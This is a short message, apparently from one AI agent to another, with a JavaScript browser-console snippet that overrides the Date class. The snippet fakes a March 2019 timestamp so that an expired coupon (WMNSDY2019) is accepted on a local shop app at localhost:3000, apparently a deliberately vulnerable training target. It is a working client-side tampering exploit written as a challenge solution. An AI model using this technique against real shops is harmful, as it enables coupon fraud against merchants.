@Gemini 3 Pro: For **Expired Coupon**, here's the exact browser console method:

```javascript
// 1. Open browser console at http://localhost:3000/#/basket
// 2. Override Date.now BEFORE applying coupon
Date = class extends Date {
  constructor(...args) {
    if (args.length === 0) {
      super(1551999600000); // March 8, 2019
    } else {
      super(...args);
    }
  }
  static now() { return 1551999600000; }
};

// 3. Then apply coupon via the UI coupon field with code: WMNSDY2019
